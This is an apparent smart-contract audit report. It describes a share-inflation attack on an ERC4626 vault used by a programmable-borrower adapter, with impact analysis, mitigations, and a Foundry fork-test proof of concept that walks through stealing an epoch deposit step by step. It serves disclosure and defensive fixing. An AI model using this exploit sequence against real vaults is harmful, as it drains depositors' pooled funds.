### Title
Unprotected ERC4626 deposit lets a vault depositor steal epoch liquidity through share inflation - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` deposits idle epoch liquidity into an external ERC4626 vault and accepts whatever share amount the vault returns, including zero shares. An unprivileged depositor in that vault can inflate its price per share before `onStartEpoch`, causing the borrower adapter’s deposit to mint dust or zero shares while the attacker retains ownership of both the donation and the deposited pool assets.

### Finding Description
At epoch start, `IdleCDOEpochVariant` sends surplus liquidity to the configured programmable borrower and invokes `onStartEpoch`, which deposits the adapter’s entire underlying balance into the configured ERC4626 vault. `onStartEpoch` snapshots `epochStartVaultAssets` before this deposit, so the subsequent vault position is treated as principal rather than as an immediately detected loss. [1](#0-0) [2](#0-1) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but performs no minimum-share check, nonzero-share check, or post-deposit asset-value check. [3](#0-2) 

If the ERC4626 vault uses balance-based `totalAssets` and lacks sufficiently protected initial liquidity or virtual shares, an attacker can:

1. Deposit `1` wei of the vault asset and receive `1` vault share.
2. Transfer `D` underlying tokens directly to the vault.
3. Wait for `onStartEpoch` to deposit `A` pool assets.
4. For `D >= A`, the vault mints `A * 1 / (D + 1) == 0` shares to `ProgrammableBorrower`.
5. Redeem the attacker’s single share for approximately `A + D + 1`, recovering the donation and stealing the full `A` pool deposit.

The adapter then has no vault shares and reports no vault assets through `vaultSharesBalance` or `_currentVaultAssets`. [4](#0-3) 

This is not merely an accounting discrepancy. During minted-interest epochs, `IdleCDOEpochVariant` normally pulls only pending withdrawals and mints epoch interest, so it does not verify that the programmable borrower still holds principal backing the CDO’s strategy-token supply. [5](#0-4) [6](#0-5) 

When principal is eventually required for withdrawals or pool closure, `onStopEpoch` can observe insufficient vault assets but still return `true`, relying on the later ERC20 `transferFrom` to fail and trigger borrower default. That failure is attributed to the borrower even though the assets were lost through the vault deposit. [7](#0-6) [8](#0-7) [9](#0-8) 

### Impact Explanation
A public ERC4626-vault depositor can permanently remove the pool liquidity deposited through `ProgrammableBorrower`. In the zero-share case, the loss is the entire epoch deposit `A`; the attacker’s `D`-token donation remains claimable through their vault share, so their net proceeds are approximately `A`.

The broken invariant is fair asset custody: the CDO minted active strategy-token backing for principal, but the programmable borrower received no corresponding ERC4626 claim. The theft becomes visible as failed withdrawals or an apparently borrower-caused default when the principal is recalled.

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault being susceptible to share-price inflation—for example, a balance-accounting vault with no meaningful dead liquidity or virtual-share protection. No protocol privilege, borrower key, manager key, or Keyring credential is required; any address that can deposit into and transfer assets to the configured vault can execute the inflation step.

The attack is particularly effective when the vault is empty or near-empty before the first programmable-borrower epoch deposit. Existing protected liquidity raises the required donation amount but does not eliminate the underlying missing-slippage issue.

### Recommendation
- Do not connect `ProgrammableBorrower` to an ERC4626 vault unless it has explicit inflation resistance, such as virtual assets/shares or permanently seeded dead liquidity.
- Record the vault shares received and revert when `shares == 0`.
- Require `vault.convertToAssets(shares)` to be within a bounded tolerance of `_assetAmount`; store an immutable or governance-controlled rounding bound.
- Revert if the post-deposit vault position does not increase by at least `_assetAmount - tolerance`, rather than accepting an empty claim.
- Consider exposing the expected minimum shares to epoch orchestration and checking the realized deposit against a pre-start price snapshot.
- Keep the configured vault immutable after initialization unless an explicit migration first withdraws all old shares and validates the new vault’s liquidity protections.

### Proof of Concept
The following Foundry fork test pattern demonstrates the zero-share case. It assumes a balance-accounting ERC4626 vault configured for `ProgrammableBorrower`; the attacker first becomes its only shareholder and inflates `totalAssets` before the epoch starts.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
function test_Erc4626InflationStealsEpochDeposit() public {
    // Fork a deployment where:
    // - programmableBorrower is IdleCDOEpochVariant.borrower()
    // - vault is programmableBorrower.vault()
    // - vault is balance-accounting and has no protected dead liquidity.
    vm.createSelectFork(vm.envString("MAINNET_RPC"), forkBlock);

    address attacker = makeAddr("attacker");
    uint256 epochDeposit = 1_000_000e6;
    uint256 donation = epochDeposit; // enough for a zero-share deposit

    // Become the only shareholder and inflate price per share.
    deal(asset, attacker, donation + 1);
    vm.startPrank(attacker);
    IERC20(asset).approve(address(vault), 1);
    uint256 attackerShares = vault.deposit(1, attacker);
    IERC20(asset).transfer(address(vault), donation);
    vm.stopPrank();

    assertEq(attackerShares, 1);
    assertEq(vault.totalSupply(), 1);
    assertEq(vault.convertToAssets(1), donation + 1);

    // Existing helper/fixture deposits `epochDeposit` into the CDO and starts
    // the epoch. During onStartEpoch, ProgrammableBorrower calls:
    // vault.deposit(epochDeposit, address(programmableBorrower)).
    depositAndStartEpoch(epochDeposit);

    // For shares = epochDeposit * 1 / (donation + 1), this rounds to zero.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.vaultSharesBalance(), 0);

    // The single attacker share claims donation + stolen epoch deposit.
    uint256 attackerBefore = IERC20(asset).balanceOf(attacker);
    vm.prank(attacker);
    uint256 redeemed = vault.redeem(attackerShares, attacker, attacker);

    assertEq(redeemed, donation + epochDeposit + 1);
    assertEq(
        IERC20(asset).balanceOf(attacker) - attackerBefore,
        donation + epochDeposit + 1
    );

    // Principal backing remains in CDO strategy-token accounting, but the
    // programmable borrower has no ERC4626 claim and cannot fund withdrawals.
    stopEpochAndAssertDefaultOrInsolvent(epochDeposit);
}
```

The critical assertion is `vault.balanceOf(address(programmableBorrower)) == 0` after a nonzero epoch deposit. The attacker then redeems one share for the donation plus the full deposit, while LP withdrawals or close-pool settlement become insolvent.
